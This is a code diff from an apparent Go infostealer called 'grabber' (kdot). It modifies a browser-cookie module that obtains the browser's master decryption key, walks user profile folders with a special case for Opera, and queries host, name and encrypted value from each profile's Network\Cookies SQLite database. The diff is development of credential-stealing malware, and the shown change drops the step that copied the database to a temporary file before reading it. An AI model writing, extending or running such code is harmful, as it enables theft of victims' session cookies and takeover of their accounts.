@@ -4,10 +4,10 @@ import (
 	"database/sql"
 	"encoding/json"
 	"os"
+	"strings"
 
-	"example.com/grabber/browsers/util"
-	"example.com/grabber/decryption"
-	_ "github.com/mattn/go-sqlite3"
+	"kdot/grabber/browsers/util"
+	"kdot/grabber/decryption"
 )
 
 type Cookies struct {
@@ -28,19 +28,26 @@ func Get() string {
 			continue
 		}
 		master_key := decryption.GetMasterKey(path + "\\Local State")
+		ranOpera := false
 		for _, profile := range extraPaths {
-			if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
-				continue
+			if ranOpera {
+				break
+			} else if strings.Contains(path, "Opera") {
+				profile = path
+				if _, err := os.Stat(path); os.IsNotExist(err) {
+					continue
+				}
+			} else {
+				if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
+					continue
+				}
+				path = path + "\\" + profile
 			}
-			path = path + "\\" + profile
-			copy_path := path + "\\Network\\Cookies" + util.RandomName()
-			util.CopyFileKDOT(path+"\\Network\\Cookies", copy_path)
-			db, err := sql.Open("sqlite3", copy_path)
+			db, err := sql.Open("sqlite3", path+"\\Network\\Cookies")
 			if err != nil {
 				continue
 			}
 			defer db.Close()
-			defer os.Remove(copy_path)
 
 			row, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
 			if err != nil {
